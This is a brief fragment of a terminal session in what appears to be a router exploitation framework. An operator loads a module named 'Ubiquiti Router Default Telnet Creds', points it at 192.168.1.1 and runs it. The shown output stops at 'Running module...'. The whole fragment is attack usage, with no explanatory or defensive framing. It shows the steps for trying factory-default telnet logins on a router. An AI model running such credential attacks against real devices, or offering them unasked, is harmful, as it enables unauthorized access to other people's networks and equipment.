...
```
exf > use creds/routers/ubiquiti/telnet_default_creds
exf (Ubiquiti Router Default Telnet Creds) > set target 192.168.1.1
[+] target => 192.168.1.1
exf (Ubiquiti Router Default Telnet Creds) > run
[*] Running module...
